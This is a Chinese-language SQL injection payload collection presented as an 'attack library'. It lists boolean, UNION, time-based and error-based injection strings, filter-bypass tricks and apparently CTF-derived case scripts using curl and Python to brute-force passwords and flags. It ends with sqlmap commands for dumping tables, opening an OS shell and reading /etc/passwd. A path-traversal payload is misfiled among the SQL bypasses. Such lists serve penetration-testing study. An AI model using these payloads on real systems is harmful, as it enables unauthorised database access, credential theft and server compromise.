# SQL注入 - 攻击库
**Keywords**: SQL Injection, SQLI, SQLi, Database, Union, Blind SQL, Error-based SQL, Boolean-based SQL, Time-based SQL, Authentication Bypass

## 基础Payload

### 布尔盲注
```sql
-- 判断真/假
username=admin' AND '1'='1
username=admin' AND '1'='0

-- 字符串长度判断
username=admin' AND LENGTH(password)>5 -- 
username=admin' AND SUBSTRING(password,1,1)='p' -- 

-- 数据库版本
username=admin' AND @@version LIKE '%5.7%' -- 
```

### UNION注入
```sql
-- 检测列数
' ORDER BY 3 -- 
' UNION SELECT NULL,NULL,NULL -- 

-- 提取数据
' UNION SELECT user(),database(),version() -- 
' UNION SELECT table_name,column_name,NULL FROM information_schema.columns -- 
```

### 时间延迟盲注
```sql
-- MySQL
' AND SLEEP(5) -- 

-- PostgreSQL
' AND pg_sleep(5) -- 

-- MSSQL
' WAITFOR DELAY '00:00:05' -- 

-- SQLite
' AND sqlite_version() LIKE 'a' UNION SELECT *, CAST((SELECT CASE WHEN 1 THEN 1 ELSE 0 END) AS TEXT), sqlite_version() -- 
```

### 错误注入
```sql
-- 通过报错显示数据
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) -- 
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) -- 

-- MSSQL错误
' AND (SELECT @@version) -- 
```

## 绕过过滤技巧

### 双点号绕过（....//）
```
id=....//....//....//flag.txt
# 实际被解析为 ../../.. 但正则检查不到
```

### 大小写混淆
```sql
UnIoN SeLeCt user(),database(),version()
SelEcT * FroM users
```

### 注释符号变体
```sql
-- MySQL注释
' OR 1=1 -- 
' OR 1=1 # 
' OR 1=1/*

-- 空字节
' OR 1=1%00
' OR 1=1%23

-- 分号
'; SELECT * FROM users; -- 
```

### 换行绕过
```sql
' OR 
1=1 -- 

SELECT/**/FROM/**/users
SELECT%0aFROM%0ausers
```

### 编码绕过
```sql
-- URL编码
%27%20OR%201%3D1%20--%20

-- Hex编码
0x636f6e63617420   (concat)
UNHEX('636f6e63617465')
```

### 操作符变体
```sql
-- 用其他操作符替代
OR -> ||
AND -> &&
= -> <=> (NULL安全比较)

-- 空格替代
tab: %09
newline: %0a, %0d
comment: /**/, --, #
```

## 实际案例提取

### 案例006: Allowlist过滤绕过
```bash
# 过滤了: OR, AND, SELECT, UNION, FROM, WHERE

# 绕过1: 换行分隔
curl -X POST http://target:5000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "private\n--"}'

# 绕过2: 大小写混淆
curl -X POST http://target:5000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "private\" Or \"1\"=\"1"}'

# 绕过3: 双斜杠
curl -X POST http://target:5000/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "....//....//....//flag"}'
```

### 案例029: 盲SQL注入
```python
import requests
import string
import time

target = "http://target/login"

# 提取FLAG字符
flag = "flag{"
for pos in range(1, 50):
    for char in string.printable:
        # 构造盲注payload
        payload = f"admin' AND SUBSTRING(password,{pos},1)='{char}' -- "
        
        r = requests.post(target, data={
            'username': payload,
            'password': 'any'
        })
        
        if 'success' in r.text or r.status_code == 200:
            flag += char
            print(f"[+] {flag}")
            break
```

### 案例039: 直接SQL注入
```bash
# 登录页面SQL注入
curl -X POST "http://target/login" \
  -d "username=admin' -- &password=anything"

# 或
curl -X POST "http://target/login" \
  -d "username=admin' OR '1'='1&password=anything"

# 获取flag
curl -X POST "http://target/search" \
  -d "query=1' UNION SELECT flag,flag,flag FROM flags -- "
```

### 案例095: 盲注提取
```python
def blind_sql_inject(target_url, parameter):
    """
    通过布尔或时间延迟进行盲注
    """
    payloads = [
        # 时间延迟检测
        f"{parameter}=1' AND SLEEP(5) -- ",
        f"{parameter}=1' AND (SELECT CASE WHEN 1 THEN SLEEP(5) END) -- ",
        
        # 布尔盲注
        f"{parameter}=1' AND '1'='1",
        f"{parameter}=1' AND '1'='0",
    ]
    
    import requests
    for payload in payloads:
        start = time.time()
        r = requests.get(target_url, params={parameter: payload})
        elapsed = time.time() - start
        
        if elapsed > 5:
            print(f"[+] 延迟注入成功: {payload}")
            return True
        
        if 'results' in r.text:
            print(f"[+] 布尔注入成功: {payload}")
            return True
```

## SQLMap命令

```bash
# 基础扫描
sqlmap -u "http://target/user.php?id=1" --batch

# 指定参数
sqlmap -u "http://target/user.php" --data="id=1" -p id --batch

# 获取数据库信息
sqlmap -u "http://target/search?q=a" --dbs

# 获取表名
sqlmap -u "http://target/search?q=a" -D database --tables

# 获取列名
sqlmap -u "http://target/search?q=a" -D database -T users --columns

# 获取数据
sqlmap -u "http://target/search?q=a" -D database -T users -C username,password --dump

# 交互式shell
sqlmap -u "http://target/search?q=a" --os-shell

# 读取文件
sqlmap -u "http://target/search?q=a" --file-read=/etc/passwd
```

## 快速识别

1. 查找数据库查询相关的参数
2. 尝试基本注入: `' OR 1=1 -- `
3. 尝试UNION注入: `' UNION SELECT NULL -- `
4. 尝试时间延迟: `' AND SLEEP(5) -- `
5. 检查错误消息（通常会泄露SQL信息）
6. 使用sqlmap自动化检测

## 常见过滤及绕过

| 过滤项 | 绕过方法 |
|-------|--------|
| `OR` | `\|\|`, 大小写, 注释, 换行 |
| `AND` | `&&`, 大小写, 注释 |
| `SELECT` | 大小写, 注释, 编码 |
| `UNION` | 大小写, 编码 |
| `'` | `\"`, 不使用引号 |
| `--` | `#`, `/**/`, 换行 |
| 空格 | `%09`, `%0a`, `/**/`, `()` |

